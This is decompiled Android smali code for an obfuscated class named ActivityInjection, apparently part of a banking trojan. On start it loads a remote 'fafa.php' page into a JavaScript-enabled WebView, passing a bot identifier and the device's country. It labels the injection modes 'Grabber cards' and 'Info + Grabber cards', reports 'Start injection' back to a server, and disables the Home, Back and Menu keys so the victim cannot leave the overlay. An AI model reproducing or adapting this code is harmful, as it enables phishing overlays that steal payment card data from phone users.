.class public Lnaqsl/ebxcb/exu/Activity/ActivityInjection;
.super Landroid/app/Activity;
.source ""


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lnaqsl/ebxcb/exu/Activity/ActivityInjection$ifdf;,
        Lnaqsl/ebxcb/exu/Activity/ActivityInjection$for;
    }
.end annotation


# instance fields
.field fddo:Lnaqsl/ebxcb/exu/ifdf;

.field ifdf:Lnaqsl/ebxcb/exu/int;


# direct methods
.method public constructor <init>()V
    .registers 2

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    new-instance v0, Lnaqsl/ebxcb/exu/ifdf;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/ifdf;-><init>()V

    iput-object v0, p0, Lnaqsl/ebxcb/exu/Activity/ActivityInjection;->fddo:Lnaqsl/ebxcb/exu/ifdf;

    new-instance v0, Lnaqsl/ebxcb/exu/int;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/int;-><init>()V

    iput-object v0, p0, Lnaqsl/ebxcb/exu/Activity/ActivityInjection;->ifdf:Lnaqsl/ebxcb/exu/int;

    return-void
.end method


# virtual methods
.method public onBackPressed()V
    .registers 1

    invoke-super {p0}, Landroid/app/Activity;->onBackPressed()V

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .registers 2
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "SetJavaScriptEnabled"
        }
    .end annotation

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    return-void
.end method

.method public onDestroy()V
    .registers 4

    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    iget-object v0, p0, Lnaqsl/ebxcb/exu/Activity/ActivityInjection;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v1, "name"

    const-string v2, "false"

    invoke-virtual {v0, p0, v1, v2}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .registers 4

    const/4 p2, 0x1

    const/4 v0, 0x3

    if-ne p1, v0, :cond_5

    return p2

    :cond_5
    const/4 v0, 0x4

    if-ne p1, v0, :cond_9

    return p2

    :cond_9
    const/16 v0, 0x52

    if-ne p1, v0, :cond_e

    return p2

    :cond_e
    const/4 p1, 0x0

    return p1
.end method

.method protected onStart()V
    .registers 8

    invoke-super {p0}, Landroid/app/Activity;->onStart()V

    iget-object v0, p0, Lnaqsl/ebxcb/exu/Activity/ActivityInjection;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v1, "name"

    const-string v2, "true"

    invoke-virtual {v0, p0, v1, v2}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {p0}, Landroid/app/Activity;->getIntent()Landroid/content/Intent;

    move-result-object v0

    const-string v1, "str"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, ""

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    const/4 v3, 0x0

    if-eqz v2, :cond_25

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_fa

    :cond_25
    iget-object v2, p0, Lnaqsl/ebxcb/exu/Activity/ActivityInjection;->fddo:Lnaqsl/ebxcb/exu/ifdf;

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    :try_start_2a
    iget-object v2, p0, Lnaqsl/ebxcb/exu/Activity/ActivityInjection;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v4, "urlInj"

    invoke-virtual {v2, p0, v4}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1
    :try_end_32
    .catch Ljava/lang/Exception; {:try_start_2a .. :try_end_32} :catch_33

    goto :goto_34

    :catch_33
    nop

    :goto_34
    new-instance v2, Landroid/webkit/WebView;

    invoke-direct {v2, p0}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V

    invoke-virtual {v2}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v4

    const/4 v5, 0x1

    invoke-virtual {v4, v5}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    const/4 v4, 0x0

    invoke-virtual {v2, v4}, Landroid/webkit/WebView;->setScrollBarStyle(I)V

    new-instance v4, Lnaqsl/ebxcb/exu/Activity/ActivityInjection$for;

    invoke-direct {v4, p0, v3}, Lnaqsl/ebxcb/exu/Activity/ActivityInjection$for;-><init>(Lnaqsl/ebxcb/exu/Activity/ActivityInjection;Lnaqsl/ebxcb/exu/Activity/ActivityInjection$fddo;)V

    invoke-virtual {v2, v4}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    new-instance v4, Lnaqsl/ebxcb/exu/Activity/ActivityInjection$ifdf;

    invoke-direct {v4, p0, v3}, Lnaqsl/ebxcb/exu/Activity/ActivityInjection$ifdf;-><init>(Lnaqsl/ebxcb/exu/Activity/ActivityInjection;Lnaqsl/ebxcb/exu/Activity/ActivityInjection$fddo;)V

    invoke-virtual {v2, v4}, Landroid/webkit/WebView;->setWebChromeClient(Landroid/webkit/WebChromeClient;)V

    invoke-static {}, Landroid/content/res/Resources;->getSystem()Landroid/content/res/Resources;

    move-result-object v3

    invoke-virtual {v3}, Landroid/content/res/Resources;->getConfiguration()Landroid/content/res/Configuration;

    move-result-object v3

    iget-object v3, v3, Landroid/content/res/Configuration;->locale:Ljava/util/Locale;

    invoke-virtual {v3}, Ljava/util/Locale;->getCountry()Ljava/lang/String;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "/fafa.php?f="

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "&p="

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v1, p0, Lnaqsl/ebxcb/exu/Activity/ActivityInjection;->ifdf:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {v1, p0}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "|"

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    invoke-virtual {p0, v2}, Landroid/app/Activity;->setContentView(Landroid/view/View;)V

    const-string v2, "grab3"

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_a1

    const-string v0, "Info + Grabber cards mini"

    :cond_a1
    const-string v2, "grab1"

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_ab

    const-string v0, "Info + Grabber cards"

    :cond_ab
    const-string v2, "grab4"

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_b5

    const-string v0, "Grabber cards mini"

    :cond_b5
    const-string v2, "grab2"

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_bf

    const-string v0, "Grabber cards"

    :cond_bf
    iget-object v2, p0, Lnaqsl/ebxcb/exu/Activity/ActivityInjection;->ifdf:Lnaqsl/ebxcb/exu/int;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "p="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, p0, Lnaqsl/ebxcb/exu/Activity/ActivityInjection;->ifdf:Lnaqsl/ebxcb/exu/int;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v6, p0, Lnaqsl/ebxcb/exu/Activity/ActivityInjection;->ifdf:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {v6, p0}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, "|Start injection "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Lnaqsl/ebxcb/exu/int;->for(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "4"

    invoke-virtual {v2, p0, v1, v0}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    :cond_fa
    return-void
.end method

.method protected onStop()V
    .registers 4

    invoke-super {p0}, Landroid/app/Activity;->onStop()V

    iget-object v0, p0, Lnaqsl/ebxcb/exu/Activity/ActivityInjection;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v1, "name"

    const-string v2, "false"

    invoke-virtual {v0, p0, v1, v2}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method
